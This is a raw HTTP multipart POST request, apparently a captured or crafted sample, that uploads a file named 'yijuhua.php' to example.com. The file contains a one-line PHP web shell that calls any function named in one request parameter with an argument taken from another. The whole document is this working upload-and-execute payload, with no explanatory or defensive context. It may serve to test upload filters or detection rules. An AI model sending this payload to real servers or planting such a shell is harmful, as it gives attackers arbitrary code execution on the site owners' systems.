POST / HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 280
Content-Type: multipart/form-data; boundary=a8d1a3aff4604c358be8203e837aee1a
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0

--a8d1a3aff4604c358be8203e837aee1a
Content-Disposition: form-data; name="submit"

submit
--a8d1a3aff4604c358be8203e837aee1a
Content-Disposition: form-data; name="file"; filename="yijuhua.php"

<?php $_REQUEST['a']($_REQUEST['b']);?>

--a8d1a3aff4604c358be8203e837aee1a--
